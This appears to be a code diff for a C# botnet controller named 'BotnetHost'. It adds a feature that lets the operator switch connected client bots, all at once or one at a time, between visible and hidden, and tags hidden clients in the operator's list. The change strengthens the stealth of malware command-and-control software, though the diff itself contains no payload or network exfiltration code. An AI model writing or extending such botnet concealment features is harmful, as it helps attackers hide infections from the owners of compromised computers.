@@ -28,6 +28,7 @@ namespace BotnetHost
         Boolean runServer = false;
         string previousLogMessage = "";
         Boolean restartClients = false;
+        Boolean hideClients = false;
 
         /// <summary>
         /// MainPanel Function, this is the constuctor for the window
@@ -120,6 +121,7 @@ namespace BotnetHost
                         clientConnection.clientSocket.Send(message);
                         clientConnection.restart = false;
                         clientConnection.hasUpdate = false;
+                        updateClientPanel();
                     } else
                     {
                         // Ping clients (check that they are still connected)
@@ -297,6 +299,10 @@ namespace BotnetHost
                 {
                     ListViewItem clientItem = new ListViewItem();
                     clientItem.Text = item.clientName;
+                    if (item.hidden)
+                    {
+                        clientItem.Text += " [Hidden]";
+                    }
                     // Add tile to main panel
                     clientListView.Invoke((MethodInvoker)delegate {
                         // Running on the UI thread
@@ -313,7 +319,6 @@ namespace BotnetHost
         /// <param name="e">This is the event argument</param>
         public void settingsChanged(object sender, EventArgs e)
         {
-            log("Sending settings to client(s)...");
             // Loop through client connections and apply settings
             foreach (ClientConnection clientConnection in clientConnections)
             {
@@ -335,6 +340,7 @@ namespace BotnetHost
                     clientConnection.restart = restartClients;
                 }
                 clientConnection.hasUpdate = true;
+                clientConnection.hidden = hideClients;
             }
         }
 
@@ -594,6 +600,65 @@ namespace BotnetHost
                         connection.hasUpdate = true;
                         settingsChanged(sender, e);
                         updateClientPanel();
+                    }
+                }
+            }
+        }
+
+        /// <summary>
+        /// Toggle Visible/Hidden for all clients
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void hideClientsBtn_Click(object sender, EventArgs e)
+        {
+            if (hideClientsBtn.Text == "Hide Clients")
+            {
+                hideClients = true;
+                settingsChanged(sender, e);
+                hideClientsBtn.Text = "Show Clients";
+            } else if (hideClientsBtn.Text == "Show Clients")
+            {
+                hideClients = false;
+                settingsChanged(sender, e);
+                hideClientsBtn.Text = "Hide Clients";
+            }
+        }
+
+        /// <summary>
+        /// Toggle Visible/Hidden for the selected client
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (clientListView.SelectedItems[0] != null)
+            {
+                string selectedClientName = clientListView.SelectedItems[0].Text;
+                try
+                {
+                    // remove ' [Hidden]' from selected client text (otherwise client will not be found in foreach loop)
+                    selectedClientName = selectedClientName.Replace(" [Hidden]", "");
+                }
+                catch (Exception er) { }
+
+                foreach (ClientConnection connection in clientConnections)
+                {
+                    if (connection.clientName == selectedClientName)
+                    {
+                        if (connection.hidden)
+                        {
+                            log("Client is hidden");
+                            connection.hidden = false;
+                            connection.hasUpdate = true;
+                            updateClientPanel();
+                        } else
+                        {
+                            log("Client is visible");
+                            connection.hidden = true;
+                            connection.hasUpdate = true;
+                            updateClientPanel();
+                        }
                     }
                 }
             }
